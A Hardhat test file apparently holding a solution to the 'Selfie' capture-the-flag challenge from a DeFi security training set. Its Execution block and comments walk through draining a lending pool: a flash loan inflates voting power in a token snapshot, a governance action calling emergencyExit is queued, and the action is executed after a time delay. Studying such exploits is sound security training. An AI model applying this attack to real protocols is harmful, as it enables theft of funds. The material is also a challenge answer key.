const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

    it('Execution', async function () {
        /** 
         * The attacker begins by deploying their malicious contract `AttackSelfie`.
         * - The contract is deployed with the addresses of the `SelfiePool`, `SimpleGovernance`, and the ERC20 token used by the pool.
         * - These addresses are passed to the constructor of the `AttackSelfie` contract to establish the necessary interfaces for the attack.
         */
        this.attackContract = await (await ethers.getContractFactory("AttackSelfie", player)).deploy(
            pool.address, governance.address, token.address
        );
    
        /** 
         * The attack is initiated by calling the `attack()` function on the `AttackSelfie` contract.
         * - This function starts the attack by requesting a flash loan of 1,500,000 tokens from the `SelfiePool`.
         * - The `SelfiePool` provides the flash loan, transferring the requested amount to the attacker contract.
         * 
         * In the `onFlashLoan()` function (called by the `SelfiePool`):
         * 1. **Snapshot Creation**:
         *    - The attacker contract calls `token.snapshot()` to take a snapshot of the token balances.
         *    - This snapshot captures the attacker's temporarily inflated token balance due to the flash loan, giving them significant voting power in the governance system.
         * 
         * 2. **Queue Malicious Action**:
         *    - The attacker contract queues a malicious action using `governance.queueAction()`.
         *    - The queued action is an `emergencyExit(address player)` function call, designed to transfer all the tokens in the `SelfiePool` to the attacker's address (`player`).
         * 
         * 3. **Loan Repayment**:
         *    - The attacker contract approves the `SelfiePool` to transfer back the flash loaned tokens, repaying the loan in full.
         *    - This completes the flash loan cycle, with the loan being repaid within the same transaction.
         */
        await this.attackContract.attack();
    
        /** 
         * After queuing the malicious action, the attacker waits for the governance delay to pass.
         * - The `evm_increaseTime` command is used to simulate the passage of time by increasing it by 2 days (2 * 24 * 60 * 60 seconds).
         * - This delay is required by the governance system to ensure actions are not executed immediately after being queued, allowing token holders time to react.
         */
        const ACTION_DELAY = 2 * 24 * 60 * 60 + 1;
        await time.increase(ACTION_DELAY);
    
        /** 
         * Finally, the attacker executes the queued action using `governance.executeAction(1)`.
         * - The action executed is the `emergencyExit()` function of the `SelfiePool`, which transfers all the tokens held by the pool to the attacker's address (`player`).
         * - This completes the attack, successfully draining the funds from the `SelfiePool`.
         */
        await governance.connect(player).executeAction(1);
    });
    

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});
